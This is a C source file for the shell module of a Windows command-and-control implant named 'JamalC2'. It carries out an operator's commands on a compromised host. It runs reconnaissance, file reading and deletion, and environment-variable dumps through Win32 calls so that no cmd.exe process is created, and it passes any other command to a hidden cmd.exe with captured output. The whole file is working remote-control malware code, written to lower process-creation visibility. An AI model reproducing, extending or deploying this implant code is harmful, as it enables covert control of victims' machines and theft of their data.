/*
 * JamalC2 Implant - Shell Command Execution
 * Built-in commands use Win32 API directly (no cmd.exe process creation)
 * Unknown commands fallback to cmd.exe /c
 */

#include "shell.h"
#include "files.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// ============== Helpers ==============

// Convert GBK (CP936) to UTF-8
static char *gbk_to_utf8(const char *gbk_str) {
  if (!gbk_str || !*gbk_str) {
    return safe_strdup("");
  }
  int wide_len = MultiByteToWideChar(CP_ACP, 0, gbk_str, -1, NULL, 0);
  if (wide_len <= 0)
    return safe_strdup(gbk_str);

  wchar_t *wide_str = (wchar_t *)safe_malloc(wide_len * sizeof(wchar_t));
  MultiByteToWideChar(CP_ACP, 0, gbk_str, -1, wide_str, wide_len);

  int utf8_len =
      WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, NULL, 0, NULL, NULL);
  if (utf8_len <= 0) {
    free(wide_str);
    return safe_strdup(gbk_str);
  }

  char *utf8_str = (char *)safe_malloc(utf8_len);
  WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, utf8_str, utf8_len, NULL, NULL);
  free(wide_str);
  return utf8_str;
}

// Case-insensitive command match, returns pointer to args (or NULL)
static const char *cmd_match(const char *input, const char *cmd) {
  size_t len = strlen(cmd);
  if (_strnicmp(input, cmd, len) != 0)
    return NULL;
  if (input[len] == '\0')
    return input + len; // no args
  if (input[len] == ' ' || input[len] == '\t')
    return input + len + 1; // skip space
  return NULL;              // not a match (e.g. "dirx")
}

// Skip leading whitespace
static const char *skip_spaces(const char *s) {
  while (*s == ' ' || *s == '\t')
    s++;
  return s;
}
// Prepend current directory as first line of output (consistent with fallback)
static char *prepend_cwd(const char *output) {
  char cwd[MAX_PATH];
  GetCurrentDirectoryA(MAX_PATH, cwd);
  size_t cwd_len = strlen(cwd);
  size_t out_len = output ? strlen(output) : 0;
  // cwd + "\n" + output + "\0"
  char *result = safe_malloc(cwd_len + 1 + out_len + 1);
  memcpy(result, cwd, cwd_len);
  result[cwd_len] = '\n';
  if (out_len > 0) {
    memcpy(result + cwd_len + 1, output, out_len);
  }
  result[cwd_len + 1 + out_len] = '\0';
  return result;
}

// ============== Built-in Commands ==============

// cd [path] - change working directory
static char *builtin_cd(const char *args) {
  char buf[MAX_PATH];
  args = skip_spaces(args);

  if (*args) {
    if (!SetCurrentDirectoryA(args)) {
      char err[512];
      snprintf(err, sizeof(err), "Cannot change to directory: %s", args);
      return safe_strdup(err);
    }
  }
  GetCurrentDirectoryA(MAX_PATH, buf);
  return safe_strdup(buf);
}

// pwd - print working directory
static char *builtin_pwd(void) {
  char buf[MAX_PATH];
  GetCurrentDirectoryA(MAX_PATH, buf);
  return safe_strdup(buf);
}

// whoami - current user
static char *builtin_whoami(void) {
  char user[256] = {0};
  DWORD size = sizeof(user);
  GetUserNameA(user, &size);

  char computer[256] = {0};
  DWORD csize = sizeof(computer);
  GetComputerNameA(computer, &csize);

  char result[512];
  snprintf(result, sizeof(result), "%s\\%s", computer, user);
  return safe_strdup(result);
}

// hostname
static char *builtin_hostname(void) {
  char buf[256] = {0};
  DWORD size = sizeof(buf);
  GetComputerNameA(buf, &size);
  return safe_strdup(buf);
}

// dir [path] - list directory
static char *builtin_dir(const char *args) {
  WIN32_FIND_DATAA fd;
  char search_path[MAX_PATH];
  char *result = NULL;
  size_t result_size = 4096;
  size_t result_used = 0;

  args = skip_spaces(args);

  // Build search path
  if (*args) {
    // Check if path is a directory (append \* if so)
    DWORD attr = GetFileAttributesA(args);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
      snprintf(search_path, MAX_PATH, "%s\\*", args);
    } else {
      strncpy(search_path, args, MAX_PATH - 1);
      search_path[MAX_PATH - 1] = '\0';
    }
  } else {
    // Current directory
    GetCurrentDirectoryA(MAX_PATH - 2, search_path);
    strcat(search_path, "\\*");
  }

  result = safe_malloc(result_size);

  // Print header: current path
  {
    // Extract directory from search path
    char dir_display[MAX_PATH];
    if (*args) {
      strncpy(dir_display, args, MAX_PATH - 1);
      dir_display[MAX_PATH - 1] = '\0';
    } else {
      GetCurrentDirectoryA(MAX_PATH, dir_display);
    }
    int n = snprintf(result, result_size, " Directory: %s\n\n", dir_display);
    result_used = n > 0 ? (size_t)n : 0;
  }

  HANDLE hFind = FindFirstFileA(search_path, &fd);
  if (hFind == INVALID_HANDLE_VALUE) {
    free(result);
    char err[512];
    snprintf(err, sizeof(err), "Cannot access: %s (error %lu)", search_path,
             GetLastError());
    return safe_strdup(err);
  }

  do {
    // Skip . and ..
    if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
      continue;

    // Format: <DIR> or size, then name
    char line[512];
    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      snprintf(line, sizeof(line), "  <DIR>          %s\n", fd.cFileName);
    } else {
      ULONGLONG size = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
      if (size >= 1073741824ULL) {
        snprintf(line, sizeof(line), "  %12.1f GB %s\n",
                 (double)size / 1073741824.0, fd.cFileName);
      } else if (size >= 1048576ULL) {
        snprintf(line, sizeof(line), "  %12.1f MB %s\n",
                 (double)size / 1048576.0, fd.cFileName);
      } else if (size >= 1024ULL) {
        snprintf(line, sizeof(line), "  %12.1f KB %s\n", (double)size / 1024.0,
                 fd.cFileName);
      } else {
        snprintf(line, sizeof(line), "  %12llu B  %s\n", size, fd.cFileName);
      }
    }

    size_t line_len = strlen(line);
    while (result_used + line_len + 1 > result_size) {
      result_size *= 2;
      result = safe_realloc(result, result_size);
    }
    memcpy(result + result_used, line, line_len);
    result_used += line_len;

  } while (FindNextFileA(hFind, &fd));

  FindClose(hFind);
  result[result_used] = '\0';

  char *utf8 = gbk_to_utf8(result);
  free(result);
  return utf8;
}

// type <file> - display file contents
static char *builtin_type(const char *args) {
  args = skip_spaces(args);
  if (!*args)
    return safe_strdup("Usage: type <filename>");

  HANDLE hFile = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    char err[512];
    snprintf(err, sizeof(err), "Cannot open file: %s", args);
    return safe_strdup(err);
  }

  DWORD file_size = GetFileSize(hFile, NULL);
  if (file_size == INVALID_FILE_SIZE || file_size > 10 * 1024 * 1024) {
    CloseHandle(hFile);
    return safe_strdup("File too large (max 10MB) or error reading size");
  }

  char *content = safe_malloc(file_size + 1);
  DWORD bytes_read;
  if (!ReadFile(hFile, content, file_size, &bytes_read, NULL)) {
    CloseHandle(hFile);
    free(content);
    return safe_strdup("Error reading file");
  }
  CloseHandle(hFile);
  content[bytes_read] = '\0';

  char *utf8 = gbk_to_utf8(content);
  free(content);
  return utf8;
}

// mkdir <path>
static char *builtin_mkdir(const char *args) {
  args = skip_spaces(args);
  if (!*args)
    return safe_strdup("Usage: mkdir <directory>");

  if (CreateDirectoryA(args, NULL)) {
    return safe_strdup("Directory created");
  } else {
    char err[512];
    snprintf(err, sizeof(err), "Failed to create directory: %s (error %lu)",
             args, GetLastError());
    return safe_strdup(err);
  }
}

// rmdir <path>
static char *builtin_rmdir(const char *args) {
  args = skip_spaces(args);
  if (!*args)
    return safe_strdup("Usage: rmdir <directory>");

  if (RemoveDirectoryA(args)) {
    return safe_strdup("Directory removed");
  } else {
    char err[512];
    snprintf(err, sizeof(err),
             "Failed to remove directory: %s (error %lu, must be empty)", args,
             GetLastError());
    return safe_strdup(err);
  }
}

// del <file>
static char *builtin_del(const char *args) {
  args = skip_spaces(args);
  if (!*args)
    return safe_strdup("Usage: del <filename>");

  if (DeleteFileA(args)) {
    return safe_strdup("File deleted");
  } else {
    char err[512];
    snprintf(err, sizeof(err), "Failed to delete: %s (error %lu)", args,
             GetLastError());
    return safe_strdup(err);
  }
}

// Parse "src dst" from args, returns 0 on success
static int parse_two_args(const char *args, char *src, char *dst,
                          size_t bufsize) {
  args = skip_spaces(args);
  // Support quoted paths: "path 1" "path 2"
  if (*args == '"') {
    const char *end = strchr(args + 1, '"');
    if (!end)
      return -1;
    size_t len = end - args - 1;
    if (len >= bufsize)
      return -1;
    memcpy(src, args + 1, len);
    src[len] = '\0';
    args = skip_spaces(end + 1);
  } else {
    const char *space = strchr(args, ' ');
    if (!space)
      return -1;
    size_t len = space - args;
    if (len >= bufsize)
      return -1;
    memcpy(src, args, len);
    src[len] = '\0';
    args = skip_spaces(space);
  }

  // dst
  if (*args == '"') {
    const char *end = strchr(args + 1, '"');
    if (!end)
      return -1;
    size_t len = end - args - 1;
    if (len >= bufsize)
      return -1;
    memcpy(dst, args + 1, len);
    dst[len] = '\0';
  } else {
    strncpy(dst, args, bufsize - 1);
    dst[bufsize - 1] = '\0';
    // Trim trailing spaces
    char *e = dst + strlen(dst) - 1;
    while (e > dst && (*e == ' ' || *e == '\t' || *e == '\r' || *e == '\n'))
      *e-- = '\0';
  }

  return (*src && *dst) ? 0 : -1;
}

// copy <src> <dst>
static char *builtin_copy(const char *args) {
  char src[MAX_PATH], dst[MAX_PATH];
  if (parse_two_args(args, src, dst, MAX_PATH) != 0)
    return safe_strdup("Usage: copy <source> <destination>");

  if (CopyFileA(src, dst, FALSE)) {
    return safe_strdup("File copied");
  } else {
    char err[512];
    snprintf(err, sizeof(err), "Copy failed (error %lu)", GetLastError());
    return safe_strdup(err);
  }
}

// move <src> <dst>
static char *builtin_move(const char *args) {
  char src[MAX_PATH], dst[MAX_PATH];
  if (parse_two_args(args, src, dst, MAX_PATH) != 0)
    return safe_strdup("Usage: move <source> <destination>");

  if (MoveFileA(src, dst)) {
    return safe_strdup("File moved");
  } else {
    char err[512];
    snprintf(err, sizeof(err), "Move failed (error %lu)", GetLastError());
    return safe_strdup(err);
  }
}

// ipconfig - fallback to cmd.exe (GetAdaptersAddresses has MinGW issues)

// env - list environment variables
static char *builtin_env(void) {
  char *env_block = GetEnvironmentStrings();
  if (!env_block)
    return safe_strdup("Failed to get environment");

  size_t cap = 8192;
  char *result = safe_malloc(cap);
  size_t used = 0;

  const char *p = env_block;
  while (*p) {
    size_t len = strlen(p);
    while (used + len + 2 >= cap) {
      cap *= 2;
      result = safe_realloc(result, cap);
    }
    memcpy(result + used, p, len);
    used += len;
    result[used++] = '\n';
    p += len + 1;
  }

  FreeEnvironmentStrings(env_block);
  result[used] = '\0';
  return result;
}

// echo <text>
static char *builtin_echo(const char *args) { return safe_strdup(args); }

// tasklist - fallback to cmd.exe (tlhelp32.h has MinGW include order issues)

// ============== Fallback: cmd.exe /c ==============

static char *shell_cmd_fallback(const char *command) {
  HANDLE hReadPipe, hWritePipe;
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOA si;
  PROCESS_INFORMATION pi;

  char *output = NULL;
  size_t output_size = 0;
  size_t output_used = 0;

  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    return safe_strdup("Failed to create pipe");
  }

  SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;
  si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  ZeroMemory(&pi, sizeof(pi));

  // Prepend "cd &" to show current directory in output
  char cmdline[2048];
  snprintf(cmdline, sizeof(cmdline), "cmd.exe /c cd & %s", command);

  if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                      NULL, &si, &pi)) {
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    return safe_strdup("Failed to execute command");
  }

  CloseHandle(hWritePipe);

  output_size = 4096;
  output = safe_malloc(output_size);

  char buffer[1024];
  DWORD bytes_read;

  while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytes_read, NULL) &&
         bytes_read > 0) {
    while (output_used + bytes_read + 1 > output_size) {
      output_size *= 2;
      output = safe_realloc(output, output_size);
    }
    memcpy(output + output_used, buffer, bytes_read);
    output_used += bytes_read;
  }

  output[output_used] = '\0';

  WaitForSingleObject(pi.hProcess, 5000);

  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hReadPipe);

  char *utf8_output = gbk_to_utf8(output);
  free(output);

  return utf8_output;
}

// ============== Main Entry ==============

char *shell_execute(const char *command) {
  const char *args;
  char *raw;    // raw output from built-in
  char *result; // final output with CWD prefix

  // Skip leading whitespace
  command = skip_spaces(command);

  // Match built-in commands (no cmd.exe process created)
  // All built-in results get CWD prepended as first line

  if ((args = cmd_match(command, "cd")) ||
      (args = cmd_match(command, "chdir"))) {
    raw = builtin_cd(args);
    result = prepend_cwd("");
    free(raw);
    return result;
  }
  // Handle bare drive letter: "C:" or "D:" etc.
  if (((command[0] >= 'A' && command[0] <= 'Z') ||
       (command[0] >= 'a' && command[0] <= 'z')) &&
      command[1] == ':' && (command[2] == '\0' || command[2] == '\\')) {
    char drive_path[4];
    drive_path[0] = command[0];
    drive_path[1] = ':';
    drive_path[2] = '\\';
    drive_path[3] = '\0';
    raw = builtin_cd(drive_path);
    result = prepend_cwd("");
    free(raw);
    return result;
  }
  if (cmd_match(command, "pwd")) {
    return prepend_cwd("");
  }

#define BUILTIN_WRAP(expr)                                                     \
  do {                                                                         \
    raw = (expr);                                                              \
    result = prepend_cwd(raw);                                                 \
    free(raw);                                                                 \
    return result;                                                             \
  } while (0)

  if ((args = cmd_match(command, "dir")) || (args = cmd_match(command, "ls")))
    BUILTIN_WRAP(builtin_dir(args));
  if ((args = cmd_match(command, "type")) || (args = cmd_match(command, "cat")))
    BUILTIN_WRAP(builtin_type(args));
  if (cmd_match(command, "whoami"))
    BUILTIN_WRAP(builtin_whoami());
  if (cmd_match(command, "hostname"))
    BUILTIN_WRAP(builtin_hostname());
  if ((args = cmd_match(command, "mkdir")) || (args = cmd_match(command, "md")))
    BUILTIN_WRAP(builtin_mkdir(args));
  if ((args = cmd_match(command, "rmdir")) || (args = cmd_match(command, "rd")))
    BUILTIN_WRAP(builtin_rmdir(args));
  if ((args = cmd_match(command, "del")) || (args = cmd_match(command, "rm")))
    BUILTIN_WRAP(builtin_del(args));
  if ((args = cmd_match(command, "copy")) || (args = cmd_match(command, "cp")))
    BUILTIN_WRAP(builtin_copy(args));
  if ((args = cmd_match(command, "move")) || (args = cmd_match(command, "mv")))
    BUILTIN_WRAP(builtin_move(args));
  // ipconfig/ifconfig: fallback to cmd.exe /c (MinGW compatibility)
  // tasklist/ps: fallback to cmd.exe /c (MinGW compatibility)
  if (cmd_match(command, "env") || cmd_match(command, "set"))
    BUILTIN_WRAP(builtin_env());
  if ((args = cmd_match(command, "echo")))
    BUILTIN_WRAP(builtin_echo(args));

#undef BUILTIN_WRAP

  // Fallback: execute via cmd.exe /c (already prepends CWD via "cd &")
  return shell_cmd_fallback(command);
}
